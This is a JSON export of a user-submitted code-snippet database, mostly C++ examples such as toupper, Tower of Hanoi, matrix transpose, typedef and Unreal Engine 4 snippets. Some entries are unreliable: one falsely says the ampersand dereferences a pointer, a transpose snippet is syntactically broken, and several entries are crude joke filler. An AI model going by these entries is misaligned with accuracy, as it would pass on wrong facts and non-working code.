    "keyword": null,
    "link": null,
    "title": " toupper c++",
    "description": "char choice;  // it will instantly transform it to upper case without the need // to convert it to int first choice = (char)toupper(choice); \ntransform(str.begin(), str.end(), str.begin(), ::toupper); \nstd::string data = \"This is a sample string.\"; // convert string to upper case std::for_each(data.begin(), data.end(), [](char & c){ c = ::toupper(c); });\nint result = toupper(charecterVariable);// return the int that corresponding upper case char //if there is none then it will return the int for the original input. //can convert int to char after char result2 = (char)toupper(variableChar);\n#include <cctype> #include <iostream> #include <cstring> #include <cstdio>  using namespace std;  int main() {     char str[] = \"John is from USA.\";      cout << \"The uppercase version of \\\"\" << str << \"\\\" is \" << endl;      for (int i=0; i<strlen(str); i++)         putchar(toupper(str[i]));          return 0; }\n// toupper example (C++) #include <iostream>       // std::cout #include <string>         // std::string #include <locale>         // std::locale, std::toupper  int main () {   std::locale loc;   std::string str=\"Test String.\\n\";   for (std::string::size_type i=0; i<str.length(); ++i)     std::cout << std::toupper(str[i],loc);   return 0; }  /* Output: TEST STRING. */\n",
    "reg_date": "2021-10-12T11:43:59.000Z"
  },
  {
    "id": 4029,
    "keyword": null,
    "link": null,
    "title": " touppercase c++",
    "description": "std::string data = \"This is a sample string.\"; // convert string to upper case std::for_each(data.begin(), data.end(), [](char & c){ c = ::toupper(c); });\n#include <cctype> #include <iostream> #include <cstring> #include <cstdio>  using namespace std;  int main() {     char str[] = \"John is from USA.\";      cout << \"The uppercase version of \\\"\" << str << \"\\\" is \" << endl;      for (int i=0; i<strlen(str); i++)         putchar(toupper(str[i]));          return 0; }\n",
    "reg_date": "2021-10-12T11:43:59.000Z"
  },
  {
    "id": 4030,
    "keyword": null,
    "link": null,
    "title": " tower of hanoi",
    "description": "//code by Soumyadeep Ghosh //insta : @soumyadepp //linked in: https://www.linkedin.com/in/soumyadeep-ghosh-90a1951b6/ #include <bits/stdc++.h>  using namespace std;  void toh(int n,char a,char b, char c) {   if(n>0)     {         /*move n-1 disks from a to b using c*/         toh(n-1,a,c,b);         /*move a disc from a to c using b and display this step performed. Also note that a and c are different in the next called function*/         cout<<\"Move a disk from \"<<a<<\" to \"<<c<<endl;         toh(n-1,b,a,c);     } } int main() {   int n;   cin>>n;   //names of the disks are a,b,c   toh(n,'a','b','c');   return 0; } //thank you!\n/// find total number of steps  int towerOfHanoi(int n) {   /// pow(2,n)-1   if (n == 0) return 0;      return towerOfHanoi(n - 1) + 1 + towerOfHanoi(n - 1); } \n#include <iostream>  using namespace std; void solve(int n,int s,int d,int h) {     if(n==1)     {         cout<<\"MOVED DISK \"<<n<<\" from\"<<s<<\"-->\"<<d<<endl;         return;     }     solve(n-1,s,h,d);     cout<<\"MOVED DISK \"<<n<<\"from\"<<s<<\"-->\"<<d<<endl;     solve(n-1,h,d,s); } int main() {     int n;     cout<<\"ENTER THE NUMBER: \";     cin>>n;     int s=1;     int h=2;     int d=3;     solve(n,s,d,h);     return 0; } \ndef towerOfHanoi(N , source, destination, auxiliary): \tif N==1: \t\tprint(\"Move disk 1 from source\",source,\"to destination\",destination) \t\treturn \ttowerOfHanoi(N-1, source, auxiliary, destination) \tprint(\"Move disk\",N,\"from source\",source,\"to destination\",destination) \ttowerOfHanoi(N-1, auxiliary, destination, source) \t\t # Driver code N = 3 towerOfHanoi(N,'A','B','C') # A, C, B are the name of rods \n",
    "reg_date": "2021-10-12T11:43:59.000Z"
  },
  {
    "id": 4031,
    "keyword": null,
    "link": null,
    "title": " tower of hanoi c++",
    "description": "//code by Soumyadeep Ghosh //insta : @soumyadepp //linked in: https://www.linkedin.com/in/soumyadeep-ghosh-90a1951b6/ #include <bits/stdc++.h>  using namespace std;  void toh(int n,char a,char b, char c) {   if(n>0)     {         /*move n-1 disks from a to b using c*/         toh(n-1,a,c,b);         /*move a disc from a to c using b and display this step performed. Also note that a and c are different in the next called function*/         cout<<\"Move a disk from \"<<a<<\" to \"<<c<<endl;         toh(n-1,b,a,c);     } } int main() {   int n;   cin>>n;   //names of the disks are a,b,c   toh(n,'a','b','c');   return 0; } //thank you!\n",
    "reg_date": "2021-10-12T11:43:59.000Z"
  },
  {
    "id": 4032,
    "keyword": null,
    "link": null,
    "title": " tower of hanoi program in c",
    "description": "//code by Soumyadeep Ghosh //insta : @soumyadepp //linked in: https://www.linkedin.com/in/soumyadeep-ghosh-90a1951b6/ #include <bits/stdc++.h>  using namespace std;  void toh(int n,char a,char b, char c) {   if(n>0)     {         /*move n-1 disks from a to b using c*/         toh(n-1,a,c,b);         /*move a disc from a to c using b and display this step performed. Also note that a and c are different in the next called function*/         cout<<\"Move a disk from \"<<a<<\" to \"<<c<<endl;         toh(n-1,b,a,c);     } } int main() {   int n;   cin>>n;   //names of the disks are a,b,c   toh(n,'a','b','c');   return 0; } //thank you!\n",
    "reg_date": "2021-10-12T11:43:59.000Z"
  },
  {
    "id": 4033,
    "keyword": null,
    "link": null,
    "title": " trailing zeroes in factorial",
    "description": "def findTrailingZeros(n):       # Initialize result     count = 0       # Keep dividing n by     # 5 & update Count     while(n >= 5):         n //= 5         count += n       return count     # Driver program n = 100 print(\"Count of trailing 0s \" +       \"in 100! is\", findTrailingZeros(n))\n#include <iostream>  using namespace std;  int main() {     ios_base::sync_with_stdio(false);     cin.tie(NULL);     int t;     cin>>t;     while(t--)     {         int n;         cin>>n;         int res=0;         for(int i=5;i<=n;i=i*5)         {             res=res+n/i;         }         cout<<res<<endl;     }     return 0; } \n// Number of trailing zeros in a factorial of a number  fn zeros(mut n: u64) -> u64 {     let mut zeros = 0;     while n > 0 {         n /= 5;         zeros += n;     }     zeros }  fn main() {     println!(\"Number of trailing zeros = {} \", zeros(14));  // 2     println!(\"Number of trailing zeros = {} \", zeros(30));  // 7 }\n# Number of trailing zeros in a factorial of a number  def zeros(n)   zeros = 0   while (n > 0)      n = (n / 5).floor     zeros += n   end   zeros   end  print \"Number of trailing zeros = \", zeros(6);   # 1 print \"\\nNumber of trailing zeros = \", zeros(30);  # 7\n",
    "reg_date": "2021-10-12T11:44:00.000Z"
  },
  {
    "id": 4034,
    "keyword": null,
    "link": null,
    "title": " transform algorithm c++",
    "description": "// vect is a vector of integers. transform(vect.begin(), vect.end(),            vect.begin(), increment); \n",
    "reg_date": "2021-10-12T11:44:00.000Z"
  },
  {
    "id": 4035,
    "keyword": null,
    "link": null,
    "title": " transformer in nlp",
    "description": "# visit following youtube video -- https://www.youtube.com/watch?v=z1xs9jdZnuY\n",
    "reg_date": "2021-10-12T11:44:00.000Z"
  },
  {
    "id": 4036,
    "keyword": null,
    "link": null,
    "title": " translate",
    "description": "upvote if you feel terrible\nnot cheating on spanish hell yea\nlife is easier with google translate ;)\nbig dick who read it\nGlad to hear that I'm not the only german, having english problems ;)\nupvote if your life sucks !\nthe spanish teacher will hunt you down if your not carefull\nnaughty boi\nHello  1. French Formal: Bonjour Informal: Salut  2. Spanish Formal: Hola Informal: &iquest;Qu&eacute; tal? (What&rsquo;s up?)  3. Russian Formal: Zdravstvuyte Informal: Privet  4. Chinese Formal: Nǐn hǎo Informal: Nǐ hǎo  5. Italian Formal: Salve Informal: Ciao  6. Japanese Formal: Konnichiwa Informal: Yā, Yō  7. German Formal: Guten Tag Informal: Hallo, Hi  8. Portuguese Formal: Ol&aacute; Informal: Oi  9. Korean Formal: Anyoung haseyo Informal: Anyoung  10. Arabic Formal: Asalaam alaikum (Peace be upon you) Informal: Ahlan  11. Danish Formal: Goddag Informal: Hej, Hall&oslash;j  12. Swahili Formal: Shikamoo Informal: Habari, Hujambo  13. Dutch Formal: Goedendag Informal: Hoi, Hallo  14. Greek Formal: Yassas Informal: Yassou  15. Polish Formal: Dzień dobry Informal: Cześć, Witaj  16. Indonesian Formal: Selamat siang Informal: Halo  17. Hindi Formal: Namaste, Namaskar Informal: Hai, Helo  18. Turkish Formal: Merhaba Informal: Selam  19. Hebrew Formal: Shalom Informal: Hey  20. Swedish Formal: God dag Informal: Hej, Tjena  21. Norwegian Formal: God dag Informal: Hei\ntranslate\n",
    "reg_date": "2021-10-12T11:44:00.000Z"
  },
  {
    "id": 4037,
    "keyword": null,
    "link": null,
    "title": " transpose function example in c++",
    "description": "#include<iostream> using namespace std; int main() {   int a[10][10], transpose[10][10], row, column, i, j;   cin>>row;   cin>>column;   cout<<\"Enter the elements of the matrix:\"<<endl;      for(int i = 0; i<row; ++i){     for(int j=0; j<column; ++j)}   cout<<\"The matrix is:\"<<endl;\n",
    "reg_date": "2021-10-12T11:44:00.000Z"
  },
  {
    "id": 4038,
    "keyword": null,
    "link": null,
    "title": " transpose matrix eigen c++",
    "description": "MatrixXcf a = MatrixXcf::Random(2,2); cout << \"Here is the matrix a\\n\" << a << endl;   cout << \"Here is the matrix a^T\\n\" << a.transpose() << endl;\n",
    "reg_date": "2021-10-12T11:44:00.000Z"
  },
  {
    "id": 4039,
    "keyword": null,
    "link": null,
    "title": " transpose of a matrix in c++",
    "description": "#include <stdio.h> #define N 4   // This function stores transpose of A[][] in B[][] void transpose(int A[][N], int B[][N]) {     int i, j;     for (i = 0; i < N; i++)         for (j = 0; j < N; j++)             B[i][j] = A[j][i]; }   int main() {     int A[N][N] = { {1, 1, 1, 1},                     {2, 2, 2, 2},                     {3, 3, 3, 3},                     {4, 4, 4, 4}};       int B[N][N], i, j;       transpose(A, B);       printf(\"Result matrix is \\n\");     for (i = 0; i < N; i++)     {         for (j = 0; j < N; j++)            printf(\"%d \", B[i][j]);         printf(\"\\n\");     }       return 0; }\n",
    "reg_date": "2021-10-12T11:44:00.000Z"
  },
  {
    "id": 4040,
    "keyword": null,
    "link": null,
    "title": " traverse through a string cpp",
    "description": " void print(const std::string &s) {     for (std::string::size_type i = 0; i < s.size(); i++) {         std::cout << s[i] << ' ';     } }\n",
    "reg_date": "2021-10-12T11:44:00.000Z"
  },
  {
    "id": 4041,
    "keyword": null,
    "link": null,
    "title": " traverse through list c++",
    "description": "for (auto it = mylist.begin(); it != mylist.end(); ++it)         cout << ' ' << *it;\n",
    "reg_date": "2021-10-12T11:44:00.000Z"
  },
  {
    "id": 4042,
    "keyword": null,
    "link": null,
    "title": " treap cp algorithms",
    "description": "",
    "reg_date": "2021-10-12T11:44:00.000Z"
  },
  {
    "id": 4043,
    "keyword": null,
    "link": null,
    "title": " tree to array c++",
    "description": "int[size] array = new int[size];  int index = 0;  void storeInOrder(node root) {  \tif (node == null)  \t\treturn;  \tstoreInOrder(root.leftChild());  \tarray[index++] = root.value;  \tstoreInOrder(root.rightChild());  } \n",
    "reg_date": "2021-10-12T11:44:01.000Z"
  },
  {
    "id": 4044,
    "keyword": null,
    "link": null,
    "title": " triangle number pattern",
    "description": "#include<bits/stdc++.h> using namespace std; int main() { \tint n; \tcin>>n; \tfor(int i=1;i<=n;i++) \t{ \t\tfor(int j=1;j<=n-i;j++) \t\t{ \t\t\tcout<<\" \"; \t\t} \t\tfor(int j=1;j<=i;j++) \t\t{ \t\t\tcout<<j<<\" \"; \t\t} \t\tcout<<endl; \t} \treturn 0;\t\t\t }\n",
    "reg_date": "2021-10-12T11:44:01.000Z"
  },
  {
    "id": 4045,
    "keyword": null,
    "link": null,
    "title": " tribonacci series c++",
    "description": " int n;     cin>>n;     int a=0,b=0,c=1;     if (n < 3) return 0;     cout<<a<<\" \"<<b<<\" \"<<c<<\" \";     for(int i = 1; i<= n-3; i++){         int d = a + b + c;         cout<<d<<\" \";         a = b;         b = c;         c = d;     }\ndef trib_iter(m):     lista=[m]     c=0     d=True     while d==True:         novalista=[]         for n in lista:             if n in [0,1,2]:                 c+=1             else:                 for i in range(1,4):                     if n-i in [0,1,2]:                         c+=1                     else:                         if n-i<0:                             pass                         else:                             novalista.append(n-i)         if novalista==[]:             d=False         else:             lista=novalista     return c \n",
    "reg_date": "2021-10-12T11:44:01.000Z"
  },
  {
    "id": 4046,
    "keyword": null,
    "link": null,
    "title": " true/false: the ampersand ( &) is used to dereference a pointer variable in c++.",
    "description": "//The ampersand is used to dereference a pointer variable int a = 10 int *ptr = &a //points to the location in memory instead of the value (10)  //Additionally, the ampersand can be used to point to another variable like so: int& b = a // points to the value of a, which is 10  //Run the following code to test cout << a << endl; cout << ptr << endl; cout << b << endl;\n",
    "reg_date": "2021-10-12T11:44:01.000Z"
  },
  {
    "id": 4047,
    "keyword": null,
    "link": null,
    "title": " try catch error",
    "description": "try {   // Try to run this code  } catch(err) {   // if any error, Code throws the error } finally {   // Always run this code regardless of error or not   //this block is optional }\ntry {   // test code } catch (error) { // if error   console.error(error); // return error }\nimport haxe.Exception;  class Main {   static function main() {     try {       try {         doSomething();       } catch(e:Exception) {         trace(e.stack);         throw e; //rethrow       }     } catch(e:Exception) {       trace(e.stack);     }   }    static function doSomething() {     throw new Exception('Terrible error');   } } \n<html>   <head>Exception Handling</head>   <body>   <script>   try {      throw new Error('This is the throw keyword'); //user-defined throw statement.   }   catch (e) {     document.write(e.message); // This will generate an error message   }   </script>   </body>   </html>  \nFirst try block try to handle it if not then catch block will handle it. Finally block will executed regardless of the outcome\n// Main program passes in two ints, checks for errors / invalid input // using template class type T for all variables within functions #include <iostream> using namespace std;  template <class T> // make function return type template (T) void getMin(T val1, T val2) {     try     {         if (val1 < val2) // if val1 less than return it as min             cout << val1 << \" is the minimum\\n\";         else if (val1 > val2)             cout << val2 << \" is the minimum\\n\";         else              throw 505; // exception error processing when input is invalid     }     catch(T my_ERROR_NUM)     {         cout << \"Input is invalid, try again. \"; // first part of error message     } }  template <class T> void getMax(T val1, T val2) // make function return type template (T) {     try     {         if (val1 > val2) // if val1 greater then return it as max             cout << val1 << \" is the maximum\\n\\n\";         else if (val1 < val2)             cout << val2 << \" is the maximum\\n\\n\";         else             throw 505; // exception error processing when input is invalid     }     catch (T random_num)     {         cout << \"Error 505!\\n\\n\"; // Second part of error messagee     } }\n",
    "reg_date": "2021-10-12T11:44:01.000Z"
  },
  {
    "id": 4048,
    "keyword": null,
    "link": null,
    "title": " try statement in c++",
    "description": "try { \t//do } catch (...){ \t//if error do }\n// exceptions #include <iostream> using namespace std;  int main () {   try   {     throw 20;   }   catch (int e)   {     cout << \"An exception occurred. Exception Nr. \" << e << '\\n';   }   return 0; }\n",
    "reg_date": "2021-10-12T11:44:01.000Z"
  },
  {
    "id": 4049,
    "keyword": null,
    "link": null,
    "title": " tu hi hai aashiqui song lyrics",
    "description": "best use of data strutures linked list and unordered_map together\nA great question on application     of priority queues and heapsXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n",
    "reg_date": "2021-10-12T11:44:01.000Z"
  },
  {
    "id": 4050,
    "keyword": null,
    "link": null,
    "title": " tuple with functions c++",
    "description": "#include <tuple> #include <iostream> #include <string> #include <stdexcept>   std::tuple<double, char, std::string> get_student(int id) {     if (id == 0) return std::make_tuple(3.8, 'A', \"Lisa Simpson\");     if (id == 1) return std::make_tuple(2.9, 'C', \"Milhouse Van Houten\");     if (id == 2) return std::make_tuple(1.7, 'D', \"Ralph Wiggum\");     throw std::invalid_argument(\"id\"); }   int main() {     auto student0 = get_student(0);     std::cout << \"ID: 0, \"               << \"GPA: \" << std::get<0>(student0) << \", \"               << \"grade: \" << std::get<1>(student0) << \", \"               << \"name: \" << std::get<2>(student0) << '\\n';       double gpa1;     char grade1;     std::string name1;     std::tie(gpa1, grade1, name1) = get_student(1);     std::cout << \"ID: 1, \"               << \"GPA: \" << gpa1 << \", \"               << \"grade: \" << grade1 << \", \"               << \"name: \" << name1 << '\\n';       // C++17 structured binding:     auto [ gpa2, grade2, name2 ] = get_student(2);     std::cout << \"ID: 2, \"               << \"GPA: \" << gpa2 << \", \"               << \"grade: \" << grade2 << \", \"               << \"name: \" << name2 << '\\n'; }\n",
    "reg_date": "2021-10-12T11:44:01.000Z"
  },
  {
    "id": 4051,
    "keyword": null,
    "link": null,
    "title": " turbo c++",
    "description": "Turbo C++ is a discontinued C++ compiler and integrated development environment.\n",
    "reg_date": "2021-10-12T11:44:02.000Z"
  },
  {
    "id": 4052,
    "keyword": null,
    "link": null,
    "title": " turbo c++ easy programs",
    "description": "#include<iostream.h> #include<conio.h> void main() { \tclrscr();  // clear the screen \tcout<<\"Hello Compiler, I am C++\"; \tgetch();  // holds output screen until user press a key }\n",
    "reg_date": "2021-10-12T11:44:02.000Z"
  },
  {
    "id": 4053,
    "keyword": null,
    "link": null,
    "title": " turbo sort codechef solution",
    "description": "#include <iostream> #include <algorithm> using namespace std;  int main() { \t// your code goes here \tint number; \tcin >> number; //input no. of elements \tint arr[number]; //defining array with size of no. of elements \tfor (int i = 0; i < number; i++) { //Loop to insert values into array \t    cin >> arr[i];  \t} \tsort(arr,arr+number); //in-built sort function to sort array in ascending order \tfor(int i=0;i<number;i++){ //Loop to output elements of array \t    cout<<arr[i]<<\"\\n\"; \t}    \treturn 0; }\n",
    "reg_date": "2021-10-12T11:44:02.000Z"
  },
  {
    "id": 4054,
    "keyword": null,
    "link": null,
    "title": " tutti i tipi di equazioni trigonometriche",
    "description": "trigono\n",
    "reg_date": "2021-10-12T11:44:02.000Z"
  },
  {
    "id": 4055,
    "keyword": null,
    "link": null,
    "title": " twitch",
    "description": "please man, ive been coding for 10 min straight, i need a break\ni just want to see some people play COD Cold War, im sorry\nI'm a grown-ass adult. You can't tell me what to do! *Goes back to work*\nYou can watch  some random dude wasting time playing video games later and finish your leftover work\nSo this is what we use grepper for now?\n// You're not my mom!\nHey, you. You're finally awake. You were trying to cross the border, right? Walked right into that Imperial ambush, same as us, and that thief over there. Damn you Stormcloaks. Skyrim was fine until you came along. Empire was nice and lazy. If they hadn't been looking for you, I could've stolen that horse and be halfway to Hammerfell. You there. You and me - we shouldn't be here. It's these Stormcloaks the Empire wants. We're all brothers and sisters in binds now, thief. Shut up back there! And what's wrong with him, huh? Watch your tongue. You're speaking to Ulfric Stormcloak, the true High King. Ulfric? The Jarl of Windhelm? You're the leader of the rebellion. But if they've captured you... Oh gods, where are they taking us? I don't know where we're going, but Sovngarde awaits. No, this can't be happening. This isn't happening. Hey, what village are you from, horse thief? Why do you care? A Nord's last thoughts should be of home. Rorikstead. I'm... I'm from Rorikstead.  ...looks like the Thalmor are with him.  General Tullius, sir. The headsman is waiting. Good. Let's get this over with! Shor, Mara, Dibella, Kynareth, Akatosh. Divines, please help me. Look at him. General Tullius the Military Governor. And it looks like the Thalmor are with him. Damn elves. I bet they had something to do with this.  Why are we stopping? Why do you think? End of the line. Let's go. Shouldn't keep the gods waiting for us. Enough with procrastination. Go back to coding.\n//Leave me alone, My code is giving stressing me out *starts stress eating and sleeping*\n//Oh, come on. It's sunday\n//play minecraft,code hard\n",
    "reg_date": "2021-10-12T11:44:02.000Z"
  },
  {
    "id": 4056,
    "keyword": null,
    "link": null,
    "title": " twitter",
    "description": "stop wasting time here and go code\nGo back to work you lazy fuck\nAre ya coding, son?\nSub Coding With Uday  channel Link - https://www.youtube.com/channel/UCDmq4Fa8Iw47s-8FYCe3ljQ\n//Are you trying to procrastinate? Go back to coding\nI'll just post about basalt instead. God it really is the best rock...\nThis is the reason you're going to fail this semester\ndont torture yourself please\nD7CkWUNjqWEszwVmRFUrQmWEPzgBfCpzVJ\nNice choice, but GO BACK TO CODING!!\n",
    "reg_date": "2021-10-12T11:44:02.000Z"
  },
  {
    "id": 4057,
    "keyword": null,
    "link": null,
    "title": " two array in c++",
    "description": "int a[2][3]= {         {1, 2, 3},         {4, 5, 6}     };          cout << a[1][1]; // Output is 5\n",
    "reg_date": "2021-10-12T11:44:02.000Z"
  },
  {
    "id": 4058,
    "keyword": null,
    "link": null,
    "title": " two c-ordinate of square given how to find other two using c++",
    "description": "#include <cstdio> #include <cmath> #include <cstring> #include <string> #include <cstdlib> #include <iostream> #include <algorithm> using namespace std; const double eps = 1e-9; #define INF 1e18 //typedef long long LL; //typedef __int64 LL; int main() {     int x1,x2,y1,y2;     int x3,y3,x4,y4;      while(~scanf(\"%d%d%d%d\",&x1,&y1,&x2,&y2))     {         int t;         if(x1 == x2 )         {             t = y1-y2;             if(t < 0)                 t = -t;             x3 = x1+t,x4 = x2+t;             y3 = y1, y4 = y2;             printf(\"%d %d %d %d\\n\",x3,y3,x4,y4);             continue;         }         if(y1 == y2)         {             t = x1-x2;             if(t < 0)                 t = -t;             y3 = y1+t,y4 = y2+t;             x3 = x1, x4 = x2;             printf(\"%d %d %d %d\\n\",x3,y3,x4,y4);             continue;         }        //if ((y2-y1) == (x2-x1))//slope 1         if ((y2-y1) == (x2-x1) || (y2-y1) == - (x2-x1))//slope of 1 or -1         {             x3 = x1, y3 = y2;             x4 = x2, y4 = y1;             printf(\"%d %d %d %d\\n\",x3,y3,x4,y4);             continue;         }          printf(\"-1\\n\");     }     return 0; } \n",
    "reg_date": "2021-10-12T11:44:02.000Z"
  },
  {
    "id": 4059,
    "keyword": null,
    "link": null,
    "title": " two d array",
    "description": "int a[2][3]= {         {1, 2, 3},         {4, 5, 6}     };          cout << a[1][1]; // Output is 5\n",
    "reg_date": "2021-10-12T11:44:02.000Z"
  },
  {
    "id": 4060,
    "keyword": null,
    "link": null,
    "title": " two elements with difference K in c++",
    "description": "bool diffK(int A[], int N, int K) {     sort(A, A+N);     int i = 0, j = 0;     while (i < N && j < N) {         if (A[i] == A[j] + K) return true;         else if (A[i] < A[j] + K) i++;         else j++;     }     return false; }\n",
    "reg_date": "2021-10-12T11:44:03.000Z"
  },
  {
    "id": 4061,
    "keyword": null,
    "link": null,
    "title": " two sum problem in c++",
    "description": "bool twosum(int A[], int N, int X) {   \tsort(A, A+N);     int i = 0, j = N-1;     while (i < j) {         if (A[i] + A[j] == X) return true;         else if (A[i] + A[j] > X) j--;         else i++;     }     return false; }\n",
    "reg_date": "2021-10-12T11:44:03.000Z"
  },
  {
    "id": 4062,
    "keyword": null,
    "link": null,
    "title": " type casting in cpp",
    "description": "int main() { \tint a=20 , b= 25 , c= 19;   \tint sum = a + b + c;   \tfloat ave = (float) sum / 3;  //this is called type casting (float) sum    \tcout<<\"Average is : \"<<ave<<endl;   \treturn 0; }\nint main() {   short a = 2000;   int b;   b = (int)a; // c-like cast notation   b = int(a); // functional notation }\nstatic_cast<int>(some_double);\ncasting\nstatic_cast: //does implicit conversions between types. void* data; pointer *pData = static_cast<pointer*>(data);  const_cast: //this can be used to remove or add the const to a variable. const char* characters; const_cast<char*>(characters);  reinterpret_cast: //this cast is dangerous since it turns one type directly into another. struct S1 { int a; } s1; int* p1 = reinterpret_cast<int*>(&s1);\n",
    "reg_date": "2021-10-12T11:44:03.000Z"
  },
  {
    "id": 4063,
    "keyword": null,
    "link": null,
    "title": " type id c++",
    "description": "decltype(0xdeedbeef) number = 0; // number is of type int! decltype(someArray[0]) element = someArray[0];\n",
    "reg_date": "2021-10-12T11:44:03.000Z"
  },
  {
    "id": 4064,
    "keyword": null,
    "link": null,
    "title": " typedef",
    "description": "#include <stdio.h> #include <string.h>   typedef struct Books {    char title[50];    char author[50];    char subject[100];    int book_id; } Book;   int main( ) {     Book book;      strcpy( book.title, \"C Programming\");    strcpy( book.author, \"Nuha Ali\");     strcpy( book.subject, \"C Programming Tutorial\");    book.book_id = 6495407;      printf( \"Book title : %s\\n\", book.title);    printf( \"Book author : %s\\n\", book.author);    printf( \"Book subject : %s\\n\", book.subject);    printf( \"Book book_id : %d\\n\", book.book_id);     return 0; }\n// typedef [type] [alias] // Example: typedef unsigned long int ulong;  ulong someNumber = 158426;\n// Typedefs can also simplify definitions or declarations for structure pointer types. Consider this:  struct Node {     int data;     struct Node *nextptr; }; // Using typedef, the above code can be rewritten like this:  typedef struct Node Node;  struct Node {     int data;     Node *nextptr; };\ntypedef int myint; \n- Type Names The command typedef can be used to give a short name to a data type.  - For example, the name long long is long, so we can define a short name ll typedef long long ll;\ntypedef int tabla1N[N + 1];\n",
    "reg_date": "2021-10-12T11:44:03.000Z"
  },
  {
    "id": 4065,
    "keyword": null,
    "link": null,
    "title": " typedef vector c++",
    "description": "      #include <vector>       //template <class Board>       typedef std::vector<Board> t_bvector;\n",
    "reg_date": "2021-10-12T11:44:03.000Z"
  },
  {
    "id": 4066,
    "keyword": null,
    "link": null,
    "title": " typeid().name() in c++",
    "description": "int is: int   i is: int  pi is: int * *pi is: int \n",
    "reg_date": "2021-10-12T11:44:03.000Z"
  },
  {
    "id": 4067,
    "keyword": null,
    "link": null,
    "title": " typeid to string c++",
    "description": "#include <string> #include <typeinfo> #include <iostream>  using namespace std;  int main(int argc, char** argv) {     string str = \"string\";     cout << typeid(str).name();     return 0; }\n",
    "reg_date": "2021-10-12T11:44:03.000Z"
  },
  {
    "id": 4068,
    "keyword": null,
    "link": null,
    "title": " types of inheritance",
    "description": "Class X {    public void methodX()    {      System.out.println(\"Class X method\");    } } Class Y extends X { public void methodY() { System.out.println(\"class Y method\"); } } Class Z extends Y {    public void methodZ()    {      System.out.println(\"class Z method\");    }    public static void main(String args[])    {      Z obj = new Z();      obj.methodX(); //calling grand parent class method      obj.methodY(); //calling parent class method      obj.methodZ(); //calling local method   } }\nOOPs support the six different types of inheritance as given below : Single inheritance. Multi-level inheritance. Multiple inheritance. Multipath inheritance. Hierarchical Inheritance. Hybrid Inheritance.\n//Base Class class A  {  public void fooA()  {  //TO DO:  } }  //Base Class class B {  public void fooB()  {  //TO DO:  } }  //Derived Class class C : A, B {  public void fooC()  {  //TO DO:  } } \n",
    "reg_date": "2021-10-12T11:44:03.000Z"
  },
  {
    "id": 4069,
    "keyword": null,
    "link": null,
    "title": " ue4 array copy c++",
    "description": "TArray<int32> IntArray;\n#include \"Containers/Array.h\" //Might need this. header file  // Syntax TArray<Variable_Type> Variable_Name;  // Example code TArray<AActor> Gun;  // For more information vist https://docs.unrealengine.com/en-US/API/Runtime/Core/Containers/TArray/index.html\n// Array copy with UE TArray<AActor*> SourceArray;  // copy SourceArray to DestArray TArray<AActor*> DestArray(SourceArray);\n",
    "reg_date": "2021-10-12T11:44:03.000Z"
  },
  {
    "id": 4070,
    "keyword": null,
    "link": null,
    "title": " ue4 c++ array",
    "description": "TArray<int32> IntArray;\n// Array copy with UE TArray<AActor*> SourceArray;  // copy SourceArray to DestArray TArray<AActor*> DestArray(SourceArray);\n",
    "reg_date": "2021-10-12T11:44:04.000Z"
  },
  {
    "id": 4071,
    "keyword": null,
    "link": null,
    "title": " ue4 c++ enum",
    "description": "UENUM() enum Status {   Stopped     UMETA(DisplayName = \"Stopped\"),   Moving      UMETA(DisplayName = \"Moving\"),   Attacking   UMETA(DisplayName = \"Attacking\"), };\n",
    "reg_date": "2021-10-12T11:44:04.000Z"
  },
  {
    "id": 4072,
    "keyword": null,
    "link": null,
    "title": " ue4 c++ how to open a blueprint widget",
    "description": "    // Where menu might be your widget.     Menu->AddToViewport();      // Step 0 get player controller.     auto PlayerController = GetFirstLocalPlayerController();     if (!ensure(PlayerController != nullptr)) return;      // Step 1 setup an input mode. There are multiple such as game only or game and UI as well.     FInputModeUIOnly InputModeData;     // Step 2 config is specific to the type     InputModeData.SetLockMouseToViewport(false);     InputModeData.SetWidgetToFocus(Menu->TakeWidget()); //Because UMG wraps Slate      // Step 3 set the mode for the player controller     PlayerController->SetInputMode(InputModeData);      // Step 4 enable cursor so you know what to click on:     PlayerController->bShowMouseCursor = true;\n",
    "reg_date": "2021-10-12T11:44:04.000Z"
  },
  {
    "id": 4073,
    "keyword": null,
    "link": null,
    "title": " ue4 c++ print to screen",
    "description": " if(GEngine)      GEngine->AddOnScreenDebugMessage(-1, 15.0f, FColor::Yellow, TEXT(\"Some debug message!\"));     \n",
    "reg_date": "2021-10-12T11:44:04.000Z"
  },
  {
    "id": 4074,
    "keyword": null,
    "link": null,
    "title": " ue4 c++ replicate actor variable",
    "description": "void AActor::GetLifetimeReplicatedProps( TArray< FLifetimeProperty > & OutLifetimeProps ) const {     DOREPLIFETIME( AActor, Owner ); }\nclass ENGINE_API AActor : public UObject {     UPROPERTY( replicated )     AActor * Owner; };\n",
    "reg_date": "2021-10-12T11:44:04.000Z"
  },
  {
    "id": 4075,
    "keyword": null,
    "link": null,
    "title": " ue4 c++ struct",
    "description": "USTRUCT([Specifier, Specifier, ...]) struct StructName {     GENERATED_USTRUCT_BODY() };\n",
    "reg_date": "2021-10-12T11:44:04.000Z"
  },
  {
    "id": 4076,
    "keyword": null,
    "link": null,
    "title": " ue4 enum c++",
    "description": "UENUM() enum class EResourceId : uint8 { \tIronOre     UMETA(DisplayName = \"Iron Ore\"), \tCopperOre   UMETA(DisplayName = \"Copper Ore\"), \tLimestone   UMETA(DisplayName = \"Limestone\"), \tCoal        UMETA(DisplayName = \"Coal\") };\nUENUM() enum Status {   Stopped     UMETA(DisplayName = \"Stopped\"),   Moving      UMETA(DisplayName = \"Moving\"),   Attacking   UMETA(DisplayName = \"Attacking\"), };\n",
    "reg_date": "2021-10-12T11:44:04.000Z"
  },
  {
    "id": 4077,
    "keyword": null,
    "link": null,
    "title": " ue4 execute delegate from blueprint",
    "description": "\tUPROPERTY(BlueprintCallable) \tFYourDelegate DelegateVar;\n",
    "reg_date": "2021-10-12T11:44:04.000Z"
  },
  {
    "id": 4078,
    "keyword": null,
    "link": null,
    "title": " ue4 find component c++",
    "description": "// YourActor is derived from AActor (could be AActor, APawn, ACharacter) YourComponent = YourActor->FindComponentByClass<UYourComponent>();\n",
